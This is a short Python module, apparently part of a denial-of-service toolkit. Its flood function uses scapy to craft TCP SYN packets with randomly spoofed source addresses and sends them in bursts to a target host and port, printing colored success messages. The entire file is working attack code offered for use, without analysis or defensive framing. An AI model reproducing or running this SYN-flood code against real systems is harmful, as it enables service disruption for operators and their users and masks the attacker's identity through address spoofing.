# Import modules
import random
from scapy.all import IP, TCP, send
import bin.addons.random_data as randomData
from stringcolor import *

red = "#ff0033"
green = "#02f93c"
yellow = "#eefc32"
blue = "\033[38;5;51m"


def flood(target):
    IP_Packet = IP()
    IP_Packet.src = randomData.random_IP()
    IP_Packet.dst = target[0]

    TCP_Packet = TCP()
    TCP_Packet.sport = random.randint(1000, 10000)
    TCP_Packet.dport = target[1]
    TCP_Packet.flags = "S"
    TCP_Packet.seq = random.randint(1000, 10000)
    TCP_Packet.window = random.randint(1000, 10000)

    for _ in range(16):
        try:
            send(IP_Packet / TCP_Packet, verbose=False)
        except Exception as e:
            print(
                f"\033[1m{cs('[✘] ERROR', red)}\033[0m {cs('while sending SYN packet', yellow)}\n{e}")
        else:
            print(
                f"{cs(f'[✔] SUCCESS', green)} {cs(f'SYN packet sent to', yellow)} {blue}{'{}:{}'.format(*target)}\033[0m")
